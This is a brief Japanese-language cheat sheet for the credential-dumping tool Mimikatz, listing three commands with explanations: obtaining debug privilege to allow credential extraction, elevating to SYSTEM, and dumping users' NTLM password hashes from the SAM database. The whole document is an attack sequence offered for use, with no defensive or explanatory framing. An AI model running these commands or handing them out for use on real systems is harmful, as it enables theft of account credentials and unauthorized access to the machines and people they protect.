# Mimikatz
[Documentation]()

## コマンド集

1. Mimikatzのプロセスにデバッグ権限を要求して、認証情報の抽出を可能にする
```
privilege::debug
```

2. SYSTEM権限に昇格する
```
token::elevate
```

3. SAMデータベースからユーザのNTLMハッシュをダンプする
```
lsadump::sam
```